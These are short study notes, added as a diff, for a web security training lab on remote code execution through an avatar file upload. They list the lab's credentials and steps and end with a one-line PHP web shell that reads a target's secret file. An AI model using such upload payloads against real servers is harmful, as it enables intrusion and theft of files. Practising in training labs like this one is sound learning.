@@ -1,0 +1,21 @@
+Lab #1: Remote code execution via web shell upload
+
+End goal: 
+- Use PHP web shell to find the contents of /home/carlos/secret
+- Submit result on the submit button
+
+wiener:peter
+
+Background:
+- file_put_contents()
+- file_put_contents()
+
+Analysis:
+
+1. Update avatar function
+
+2. Discover the file server endpoint
+
+3. Write RCE code basedd on PHP
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
